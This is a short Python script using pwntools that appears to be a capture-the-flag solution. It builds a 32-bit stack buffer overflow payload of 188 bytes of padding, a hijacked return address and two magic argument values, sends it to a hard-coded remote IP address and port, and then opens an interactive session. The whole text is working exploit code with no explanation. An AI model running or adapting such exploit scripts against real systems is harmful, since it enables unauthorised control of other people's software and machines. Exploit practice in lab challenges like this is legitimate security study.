from pwn import * 

#its not p64, make sure to read description about elf file
addr = p32(0x080491e2)
addr1 = p32(0xdeadbeef)
addr2 = p32(0xc0ded00d)

payload = b"A" * 188 + addr + b"A"*4 + addr1 + addr2

r = remote("206.189.28.151",31054)
r.sendline(payload)
r.interactive()
